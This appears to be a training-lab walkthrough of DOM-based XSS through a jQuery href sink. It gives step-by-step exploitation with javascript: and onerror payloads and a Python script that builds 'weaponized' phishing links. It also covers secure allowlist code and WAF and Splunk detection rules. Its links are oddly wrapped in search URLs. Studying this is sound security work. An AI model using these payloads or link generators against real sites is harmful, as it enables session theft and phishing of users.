# Lab Walkthrough: DOM XSS in jQuery Anchor `href` Attribute Sink

* **Vulnerability Type:** DOM-Based Cross-Site Scripting (XSS)
* **Target Context:** Client-Side JavaScript (jQuery `attr('href')` Sink)
* **Skill Level:** Apprentice (Beginner)
* **Estimated Completion Time:** 10–15 minutes
* **Lab Status:** Not Solved

---

## Legal & Ethical Disclaimer

> [!WARNING]
> The scripts, payloads, methodologies, and technical documentation contained in this repository are strictly intended for educational exercises, CTF competitions, and authorized security assessments. Executing these tests against infrastructure without prior, explicit, written engagement contracts is illegal. The author disclaims all liability for misuse.

---

## Table of Contents

1. [Vulnerability Architecture & Mechanism](https://www.google.com/search?q=%231-vulnerability-architecture--mechanism)
2. [Lab Objectives & Verification Criteria](https://www.google.com/search?q=%232-lab-objectives--verification-criteria)
3. [Step-by-Step Exploitation Flow](https://www.google.com/search?q=%233-step-by-step-exploitation-flow)
4. [JavaScript Sinks Comparison](https://www.google.com/search?q=%234-javascript-sinks-comparison)
5. [Automated Exploitation Script (Python PoC)](https://www.google.com/search?q=%235-automated-exploitation-script-python-poc)
6. [Defense, Hardening & Secure Coding](https://www.google.com/search?q=%236-defense-hardening--secure-coding)
7. [SIEM Detection & Telemetry Analysis](https://www.google.com/search?q=%237-siem-detection--telemetry-analysis)
8. [Troubleshooting & Diagnostic Runbook](https://www.google.com/search?q=%238-troubleshooting--diagnostic-runbook)
9. [References & Standards](https://www.google.com/search?q=%239-references--standards)

---

## 1. Vulnerability Architecture & Mechanism

This vulnerability occurs when a web application reads unvalidated input from the URL (the Source) and dynamically assigns it to the `href` attribute of an anchor (`<a>`) tag using jQuery (the Sink).

* **Real-World Analogy:** Imagine filling out a "Return to Sender" form at a post office, but instead of writing a physical address, you write instructions like "Rob the vault." If the post office blindly follows whatever is written on that line when processing the return, the instructions execute.
* **The Source (`location.search`):** The application extracts the `returnPath` parameter directly from the URL query string.
* **The Sink (`$('#backLink').attr('href', ...)`):** jQuery dynamically updates the HTML `href` attribute with the attacker's input.
* **The Execution Vector:** By supplying the `javascript:` pseudo-protocol, the browser is instructed to execute the subsequent string as JavaScript when the link is clicked, rather than navigating to a new URL.

```text
┌────────────────────────────────────────────────────────────────────────┐
│                      DOM XSS (HREF SINK) FLOW                          │
└────────────────────────────────────────────────────────────────────────┘

  [1. Attacker] Sends a crafted URL to the victim:
  https://target.com/feedback?returnPath=javascript:alert(document.cookie)
           │
           ▼
  [2. Victim Browser] Loads the page. 
           │
           ▼
  [3. Client JS] Reads query string: 
  let path = new URLSearchParams(window.location.search).get('returnPath');
           │
           ▼
  [4. Sink Execution] jQuery updates the DOM:
  $('#backLink').attr('href', path);
  Result: <a id="backLink" href="javascript:alert(document.cookie)">Back</a>
           │
           ▼
  [5. Victim Action] Victim clicks the "Back" link. Payload executes,
  stealing session cookies or performing unauthorized actions.

```

> **Learning Checkpoint 1:** Why is the `javascript:` protocol critical here? In an `href` context, standard HTML injection (like `<script>`) fails because the data is trapped inside the attribute string. The `javascript:` pseudo-protocol explicitly tells the browser's navigation engine to transition from URL routing to JavaScript execution.

---

## 2. Lab Objectives & Verification Criteria

* **Target Surface:** The "Submit feedback" page and its "Back" link functionality.
* **Primary Objective:** Hijack the `href` attribute to execute JavaScript upon user interaction.
* **Validation Signal:** Triggering an `alert(document.cookie)` when the "Back" link is clicked.

---

## 3. Step-by-Step Exploitation Flow

### Phase 1: Reconnaissance & Source Mapping

* Navigate to the "Submit feedback" page.
* Observe the URL structure. Note the parameter controlling the return destination: `?returnPath=/`
* Modify the parameter to a harmless tracking string: `?returnPath=/CyberTest123`
* Inspect the "Back" link in the DOM (using Developer Tools -> Elements).
* *Observation:* The `href` attribute updates dynamically: `<a href="/CyberTest123">Back</a>`.

### Phase 2: Payload Construction

* Since the input lands directly inside an `href` attribute, breaking out with `">` is an option, but utilizing the native `javascript:` protocol is cleaner and stealthier.
* Construct the payload to target session data (a common red teaming objective):
`javascript:alert(document.cookie)`

### Phase 3: Injection & Execution

* Inject the payload into the URL parameter:
`?returnPath=javascript:alert(document.cookie)`
* Hit Enter to reload the page and process the JavaScript assignment.
* Verify the DOM has updated: `<a href="javascript:alert(document.cookie)">Back</a>`
* Click the "Back" link.
* *Result:* The browser executes the payload and displays the session cookie.

> **Learning Checkpoint 2:** Why must the victim click the link? Unlike `innerHTML` or `document.write` sinks which execute immediately upon rendering, an `href` sink requires user interaction (a click) to trigger the JavaScript execution context.

---

## 4. JavaScript Sinks Comparison

Identifying the correct sink dictates the payload syntax required for exploitation.

| Sink Type | Example | Execution Trigger | Payload Format |
| --- | --- | --- | --- |
| **Navigation / URI** | `a.href`, `iframe.src`, `window.location` | User Interaction (Click) or Page Load | `javascript:alert(1)` |
| **HTML Execution** | `innerHTML`, `document.write` | Immediate on render | `<img src=x onerror=alert(1)>` |
| **Direct Execution** | `eval()`, `setTimeout()` | Immediate on execution | `alert(1)` |
| **Safe Text** | `textContent`, `innerText` | **None (Safe)** | N/A (Renders as literal text) |

---

## 5. Automated Exploitation Script (Python PoC)

In an offensive security scenario, attackers automate the generation of weaponized URLs to distribute via phishing campaigns.

```python
#!/usr/bin/env python3
"""
DOM XSS (href context) Weaponized Link Generator (PoC)
Generates URL-encoded payloads targeting the jQuery attr() sink.
"""

import urllib.parse
import sys

def generate_phishing_link(target_url):
    # The javascript pseudo-protocol payload
    raw_payload = 'javascript:alert(document.cookie)'
    
    # URL encode the payload for safe transport
    encoded_payload = urllib.parse.quote(raw_payload)
    
    # Construct the final weaponized URL
    weaponized_link = f"{target_url}/feedback?returnPath={encoded_payload}"
    
    print("[*] Generating Weaponized DOM XSS Link (href context)...")
    print(f"[+] Distribute this URL to target: \n{weaponized_link}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 dom_href_gen.py <target_base_url>")
        sys.exit(1)
        
    target = sys.argv[1].rstrip('/')
    generate_phishing_link(target)

```

---

## 6. Defense, Hardening & Secure Coding

To secure URI-based sinks, input validation must strictly enforce protocol allowances.

* **Protocol Whitelisting:** Before assigning a URL to an `href` or `src` attribute, validate that it begins with a safe protocol (e.g., `http://`, `https://`, or a relative path `/`).
* *Secure Example:*
```javascript
let path = new URLSearchParams(window.location.search).get('returnPath');
if (path && (path.startsWith('http://') || path.startsWith('https://') || path.startsWith('/'))) {
    $('#backLink').attr('href', path);
} else {
    $('#backLink').attr('href', '/'); // Default safe fallback
}

```




* **URL Encoding:** Ensure any dynamic parameters added to the URL are properly URL-encoded.
* **Content Security Policy (CSP):** Implement strict CSP headers to block inline scripts and restrict navigation to untrusted schemas.

---

## 7. SIEM Detection & Telemetry Analysis

Detecting URI-based DOM XSS focuses on identifying the `javascript:` pseudo-protocol within query strings.

### WAF / Detection Rule Examples (Regex)

* **JavaScript URI Scheme:** `(?i)javascript:`
* **Data URI Scheme (Alternative):** `(?i)data:text/html`

### Splunk Search Query (SPL)

```spl
index=web_proxy sourcetype=access_combined 
| regex uri_query="(?i)javascript:|%6a%61%76%61%73%63%72%69%70%74%3a"
| stats count by src_ip, uri_path, uri_query
| where count > 0

```

---

## 8. Troubleshooting & Diagnostic Runbook

| Symptom | Probable Cause | Corrective Action |
| --- | --- | --- |
| **Payload navigates to a broken URL (e.g., `%22javascript:...`)** | Over-encoded or breaking context unnecessarily. | Do not use quotes (`"`) or brackets (`< >`). The input is already expected to be a string inside the `href`. Just inject the protocol directly. |
| **Nothing happens on click** | Browser security blocks (XSS Auditor) or invalid syntax. | Ensure the syntax is exact: `javascript:alert(1)`. No trailing spaces before the protocol. |
| **The link points to `[http://target.com/javascript:alert(1](http://target.com/javascript:alert(1))**` | Application prepends the base URL automatically. | You must find a way to break out of the prepended string, or this specific vector is mitigated by the framework. |

---

## 9. References & Standards

* [PortSwigger: DOM-Based XSS](https://www.google.com/search?q=https://portswigger.net/web-security/cross-site-scripting/dom-based)
* [OWASP Top 10-2021: A03 - Injection](https://www.google.com/search?q=https://owasp.org/Top10/A03_2021-Injection/)
* [OWASP: DOM based XSS Prevention Cheat Sheet](https://www.google.com/search?q=https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)

---

> **Key Insight:** In client-side attacks, the execution vector is dictated entirely by the sink type. While HTML sinks require structural manipulation (`<img>`, `<svg>`), navigation sinks like `href` turn standard URLs into direct execution pipelines using the `javascript:` pseudo-protocol—making strict protocol whitelisting the only effective defense.
